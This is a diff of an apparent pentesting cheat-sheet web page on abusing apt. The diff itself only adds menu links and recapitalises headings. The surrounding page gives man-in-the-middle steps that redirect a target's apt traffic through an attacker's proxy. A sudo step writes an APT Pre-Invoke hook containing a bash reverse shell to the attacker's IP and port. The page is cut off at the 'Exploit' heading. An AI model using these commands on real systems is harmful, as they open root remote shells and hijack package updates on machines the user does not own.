@@ -144,6 +144,9 @@
   <li><a href="https://tldrbins.github.io/@mitmproxy/">Mitmproxy</a></li>
   <li><a href="https://tldrbins.github.io/@apt/">Apt</a></li>
   <li><a href="https://tldrbins.github.io/@sudo/">Sudo</a></li>
+  <li><a href="https://tldrbins.github.io/@ubuntu/">Ubuntu</a></li>
+  <li><a href="https://tldrbins.github.io/@debian/">Debian</a></li>
+  <li><a href="https://tldrbins.github.io/@package-management/">Package Management</a></li>
 </ul>
 <hr>
 <div class="content">
@@ -166,23 +169,23 @@
 	</div>
 </div>
   <h3 id="mitm-man-in-the-middle">MITM (Man-in-the-Middle)</h3>
-<h4 id="1-add-proxy-path-in-target-machine">1. Add proxy path in target machine</h4>
+<h4 id="1-add-proxy-path-in-target-machine">1. Add Proxy Path in Target Machine</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export http_proxy=http://<span class="o editable-keyword">&lt;LOCAL_IP&gt;</span>:<span class="o editable-keyword">&lt;LOCAL_PROXY_PORT&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div><h4 id="2-start-proxy-in-local-machine">2. Start proxy in local machine</h4>
+TO-DO</div></pre></div><h4 id="2-start-proxy-in-local-machine">2. Start Proxy in Local Machine</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Tool
 </span></span><span class="line"><span class="cl"><span class="go">pip3 install --upgrade proxy.py
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a proxy server
 </span></span><span class="line"><span class="cl"><span class="go">proxy --hostname 0.0.0.0 --port <span class="o editable-keyword">&lt;LOCAL_PROXY_PORT&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div><h4 id="3-redirect-traffic-to-our-server">3. Redirect traffic to our server</h4>
+TO-DO</div></pre></div><h4 id="3-redirect-traffic-to-our-server">3. Redirect Traffic to Our Server</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Edit /etc/hosts in target machine
 </span></span><span class="line"><span class="cl"><span class="go"><span class="o editable-keyword">&lt;LOCAL_IP&gt;</span> apt.update.example.com
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><hr>
 <h3 id="sudo">SUDO</h3>
-<h4 id="1-create-a-malicious-config">1. Create a malicious config</h4>
+<h4 id="1-create-a-malicious-config">1. Create a Malicious Config</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i &gt;&amp; /dev/tcp/<span class="o editable-keyword">&lt;LOCAL_IP&gt;</span>/<span class="o editable-keyword">&lt;LOCAL_PORT&gt;</span> 0&gt;&amp;1'\''"}' &gt; /etc/apt/apt.conf.d/evil
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><h4 id="2-exploit">2. Exploit</h4>
